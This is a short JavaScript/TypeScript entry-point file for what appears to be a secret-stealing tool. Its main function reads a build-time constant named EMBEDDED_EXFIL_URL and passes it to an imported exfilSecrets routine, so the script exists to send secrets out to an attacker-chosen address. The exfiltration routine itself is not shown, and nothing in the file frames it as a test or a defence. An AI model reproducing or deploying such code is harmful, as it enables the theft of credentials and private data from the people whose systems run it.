import { exfilSecrets } from './commands/exfil';


async function main() {
  const exfilUrl = typeof EMBEDDED_EXFIL_URL !== 'undefined' ? EMBEDDED_EXFIL_URL : null;


  exfilSecrets(exfilUrl);
}

main().catch(err => {
  console.error('❌ Fatal error:', err);
  process.exit(1);
});